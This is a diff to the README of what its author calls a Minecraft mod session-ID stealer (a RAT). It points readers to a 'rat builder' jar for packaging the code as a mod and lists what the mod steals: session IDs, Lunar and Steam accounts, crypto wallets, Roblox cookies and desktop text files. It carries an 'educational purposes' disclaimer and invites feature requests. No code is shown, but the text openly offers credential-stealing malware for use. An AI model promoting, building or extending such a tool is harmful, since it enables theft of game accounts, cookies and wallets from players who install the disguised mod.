@@ -2,10 +2,9 @@
 ## Hi heres the code to my minecraft mod session id stealer
 ## This is purely for educational purposes
 
-## FULL RECODE COMING SOON as of 15/08/2023 - done on 02/10/23 (no it didnt take a month and a half to code this, i was just lazy :()
 ### https://discord.gg/aKEYP4cGSq
 
-### to turn this code into a .jar minecraft mod use the rat builder .jar file in https://github.com/iLoveRat/SkyblockRat/releases/tag/fixedratbuilder 
+### to turn this code into a .jar minecraft mod use the rat builder (newsilly-2.0.jar) in https://github.com/iLoveRat/SkyblockRat/releases/tag/newratbuilder
 
 #### The rat steals:
 - minecraft session id
@@ -18,6 +17,9 @@
 - lunar accounts file
 - steam accounts
 - crypto wallets
+- all desktop txts
+- mods folder
+- prob other stuff i fogor to list
 
 ### ill add more stuff if u want me to dm me iloverat.9200 on discord / iloverat#9200 on guilded just dont ask for something stupid like a roblox cookie stealer (it already steals roblox cookies)
 
